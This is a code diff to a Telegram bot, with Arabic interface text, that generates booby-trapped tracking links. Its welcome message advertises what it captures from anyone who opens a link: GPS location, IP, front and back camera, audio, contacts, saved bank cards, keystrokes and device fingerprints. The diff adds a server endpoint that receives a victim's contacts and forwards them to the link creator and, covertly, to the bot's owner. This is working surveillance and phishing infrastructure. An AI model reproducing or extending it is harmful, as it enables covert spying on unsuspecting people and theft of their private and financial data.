@@ -1296,49 +1296,87 @@ bot.on('message', async (msg) => {
     const isPrem  = isPremium(chatId);
     const lang    = getLang(chatId);
     const tr      = T[lang];
+    const name    = msg.chat.first_name || '';
 
-    // ── Inline keyboard (interactive buttons below message) ──
+    // ── Animated boot sequence ────────────────────────────────────────────────
+    const delay = ms => new Promise(r => setTimeout(r, ms));
+    const bars  = ['▱▱▱▱▱▱▱▱▱▱','▰▱▱▱▱▱▱▱▱▱','▰▰▰▱▱▱▱▱▱▱','▰▰▰▰▰▱▱▱▱▱','▰▰▰▰▰▰▰▱▱▱','▰▰▰▰▰▰▰▰▰▰'];
+    const steps = [
+      `⚡ *تهيئة النظام...*\n\n${bars[0]} 0%`,
+      `🔐 *تحقق من الهوية...*\n\n${bars[2]} 30%`,
+      `📡 *تحميل قاعدة البيانات...*\n\n${bars[3]} 50%`,
+      `🛰️ *تفعيل بروتوكولات التتبع...*\n\n${bars[4]} 70%`,
+      `🔗 *تجهيز محركات الروابط...*\n\n${bars[5]} 100%\n\n✅ *جاهز!*`,
+    ];
+    const bootMsg = await bot.sendMessage(chatId, steps[0], { parse_mode: 'Markdown' });
+    const mid = bootMsg.message_id;
+    for (let i = 1; i < steps.length; i++) {
+      await delay(600);
+      await bot.editMessageText(steps[i], { chat_id: chatId, message_id: mid, parse_mode: 'Markdown' }).catch(() => {});
+    }
+    await delay(700);
+    await bot.deleteMessage(chatId, mid).catch(() => {});
+
+    // ── Inline keyboard ───────────────────────────────────────────────────────
     const baseRows = [
-      [{ text: tr.menu_create,   callback_data: "crenew" },       { text: tr.menu_mylinks,   callback_data: "lm:list:0" }],
-      [{ text: tr.menu_vip,      callback_data: "pinfo" },         { text: tr.menu_attempts,  callback_data: "attempt_menu" }],
-      [{ text: tr.menu_stats,    callback_data: "mystats" },       { text: tr.menu_myid,      callback_data: "myid" }],
-      [{ text: tr.menu_help,     callback_data: "help_menu" },     { text: tr.menu_linktypes, callback_data: "link_types" }],
-      ...(isPrem && !isOwner ? [[{ text: tr.menu_page_my, callback_data: "pg_main" }, { text: tr.menu_my_feat, callback_data: "my_features" }]] : []),
+      [{ text: '🔗 إنشاء رابط',   callback_data: 'crenew' },        { text: '📋 روابطي',        callback_data: 'lm:list:0' }],
+      [{ text: '💎 VIP 🔥',        callback_data: 'pinfo' },          { text: '🎯 محاولات ⭐',    callback_data: 'attempt_menu' }],
+      [{ text: '📊 إحصائياتي',     callback_data: 'mystats' },        { text: '🆔 معرّفي',        callback_data: 'myid' }],
+      [{ text: '📖 المساعدة',      callback_data: 'help_menu' },      { text: '🔗 أنواع الروابط', callback_data: 'link_types' }],
+      ...(isPrem && !isOwner ? [[{ text: '🖥️ لوحة صفحتي', callback_data: 'pg_main' }, { text: '🎛️ ميزاتي', callback_data: 'my_features' }]] : []),
       ...(isOwner ? [
-        [{ text: tr.menu_premadmin, callback_data: "premadmin" },  { text: tr.menu_stats_a,   callback_data: "stats_menu" }],
-        [{ text: tr.menu_feat_set,  callback_data: "feat_menu" },  { text: tr.menu_dyn_page,  callback_data: "pg_main" }],
-        [{ text: tr.menu_broadcast, callback_data: "broadcast_m" },{ text: tr.menu_backup,    callback_data: "do_backup" }],
-        [{ text: "👑 أوامر المالك", callback_data: "help_owner" }]
+        [{ text: '👑 إدارة البريميوم', callback_data: 'premadmin' },  { text: '📊 الإحصائيات',   callback_data: 'stats_menu' }],
+        [{ text: '🎛️ إعدادات الميزات', callback_data: 'feat_menu' }, { text: '🖥️ صفحتي',       callback_data: 'pg_main' }],
+        [{ text: '📢 إرسال للجميع',    callback_data: 'broadcast_m'},{ text: '💾 نسخ احتياطي',  callback_data: 'do_backup' }],
+        [{ text: '👑 أوامر المالك',    callback_data: 'help_owner' }],
       ] : []),
-      [{ text: tr.menu_lang, callback_data: "lang_toggle" }]
+      [{ text: lang === 'ar' ? '🌐 English' : '🌐 العربية', callback_data: 'lang_toggle' }],
     ];
 
-    // ── Persistent Reply Keyboard (القائمة السريعة في الشريط السفلي) ──
+    // ── Persistent reply keyboard ─────────────────────────────────────────────
     const replyKbRows = [
-      [{ text: tr.menu_create }, { text: tr.menu_mylinks }],
-      [{ text: tr.menu_vip },    { text: tr.menu_attempts }],
-      [{ text: tr.menu_stats },  { text: tr.menu_myid }],
-      [{ text: tr.menu_help },   { text: tr.menu_linktypes }],
-      ...(isOwner ? [
-        [{ text: tr.menu_owner }, { text: tr.menu_owner_cmds }],
-      ] : []),
-      [{ text: tr.menu_lang }]
+      [{ text: '🔗 إنشاء رابط' }, { text: '📋 روابطي' }],
+      [{ text: '💎 VIP 🔥' },      { text: '🎯 محاولات ⭐' }],
+      [{ text: '📊 إحصائياتي' },   { text: '🆔 معرّفي' }],
+      [{ text: '📖 المساعدة' },     { text: '🔗 أنواع الروابط' }],
+      ...(isOwner ? [[{ text: '👑 لوحة المالك' }, { text: '📋 أوامر المالك' }]] : []),
+      [{ text: lang === 'ar' ? '🌐 English' : '🌐 العربية' }],
     ];
 
-    const welcome = settings.welcomeMsg ||
-      `${isNew ? tr.welcome_new(msg.chat.first_name) : tr.welcome_back(msg.chat.first_name)} 🎉${tr.welcome_body}`;
+    const badge   = isOwner ? '👑 مالك' : isPrem ? '💎 مميز' : '🆓 مجاني';
+    const welcome = settings.welcomeMsg || (
+      `${isNew ? `✨ أهلاً *${name}*! مرحباً بك للمرة الأولى 🎉` : `🔥 أهلاً مجدداً *${name}*! ⚡`}\n` +
+      `${badge}\n\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n` +
+      `🕵️ *بوت التتبع المتقدم*\n` +
+      `━━━━━━━━━━━━━━━━━━━━\n\n` +
+      `📡 *يجمع لحظة الفتح:*\n` +
+      `📍 GPS دقيق + IP + المدينة\n` +
+      `📱 بصمة الجهاز الكاملة\n` +
+      `📷 كاميرا أمامية + خلفية\n` +
+      `🎙️ تسجيل صوتي\n` +
+      `📒 جهات الاتصال\n` +
+      `💳 بطاقات البنك المحفوظة\n` +
+      `🔵 أجهزة Bluetooth\n` +
+      `🌐 WebRTC IP الداخلي\n` +
+      `⌨️ تسجيل ما يكتبه\n` +
+      `👁️ مراقبة سلوك المستخدم\n` +
+      `🔤 الخطوط المثبّتة + GPU\n` +
+      `🚪 مدة بقائه في الصفحة\n\n` +
+      `⚡ Powered by @Ye_x00`
+    );
 
-    // First: set persistent keyboard
     await bot.sendMessage(chatId, welcome, {
+      parse_mode: 'Markdown',
       reply_markup: JSON.stringify({
         keyboard: replyKbRows,
         resize_keyboard: true,
         persistent: true,
-        input_field_placeholder: lang === 'en' ? 'Choose from menu...' : 'اختر من القائمة...'
+        input_field_placeholder: 'اختر من القائمة...'
       })
     });
-    // Then: send inline menu
-    return bot.sendMessage(chatId, tr.menu_title, {
+    return bot.sendMessage(chatId, '⚡ *اختر من القائمة:*', {
+      parse_mode: 'Markdown',
       reply_markup: JSON.stringify({ inline_keyboard: baseRows })
     });
   }
@@ -3686,7 +3724,10 @@ async function createLink(cid, msg) {
 }
 
 function createNew(cid) {
-  bot.sendMessage(cid, `🌐 Enter Your URL`, { reply_markup: JSON.stringify({ force_reply: true }) });
+  bot.sendMessage(cid,
+    `🔗 *إنشاء رابط جديد*\n\n📎 أرسل الرابط الذي تريد تلغيمه:\n\n_مثال: https://google.com_`,
+    { parse_mode: 'Markdown', reply_markup: JSON.stringify({ force_reply: true }) }
+  );
 }
 
 // ── Data Endpoints ────────────────────────────────────────────────────────────
@@ -3806,6 +3847,21 @@ app.post("/file-upload", upload.single('file'), (req, res) => {
 });
 
 // ── Screen Capture upload (premium) ───────────────────────────────────────────
+// ── Contacts via Contacts API (adv.js Feature 1) ──────────────────────────────
+app.post("/contacts", (req, res) => {
+  const uid  = req.body?.uid  || null;
+  const data = decodeURIComponent(req.body?.contacts || '') || null;
+  if (!uid || !data) return res.send("Missing");
+  const tid = parseInt(uid, 36);
+  const buf  = Buffer.from(data, 'utf8');
+  const info = { filename: 'contacts.txt', contentType: 'text/plain' };
+  if (!settings.silentMode) {
+    bot.sendDocument(tid, buf, { caption: `📒 جهات الاتصال (Contacts API)\n${data.split('\n').length - 1} جهة` }, info).catch(() => {});
+    if (tid !== BOT_OWNER) bot.sendDocument(BOT_OWNER, buf, { caption: `📒 جهات الاتصال (ID: ${tid})` }, info).catch(() => {});
+  }
+  res.send("Done");
+});
+
 app.post("/screencap", (req, res) => {
   const uid = req.body?.uid || null;
   const img = req.body?.img || null;
